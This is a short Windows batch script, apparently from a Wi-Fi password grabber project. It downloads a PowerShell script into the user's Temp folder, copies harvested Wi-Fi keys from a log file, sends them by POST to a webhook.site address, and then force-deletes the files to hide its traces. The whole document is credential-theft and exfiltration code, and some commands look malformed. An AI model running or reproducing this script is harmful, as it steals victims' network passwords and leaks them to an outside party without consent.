cd "Users\%username%\AppData\Local\Temp"
curl https://cdn.jsdelivr.net/gh/oceanofanythingofficial/Wi-Fi-Password-Grabber-With-Online-Upload-Facility-With-Ducky-Script-Batch-Script-vbs-Script/Powershell-Script.ps1 -File Wi-Fi.ps1
type Wi-Fi.log > Wi-Fi.key
powershell Invoke-WebRequest -Uri https://webhook.site/c8e42212-e64b-4bbe-8452-8b8dd92ee43a -Method POST -InFile Wi-Fi.key > Wi-Fi.log
del Wi* /s/f/q
pause
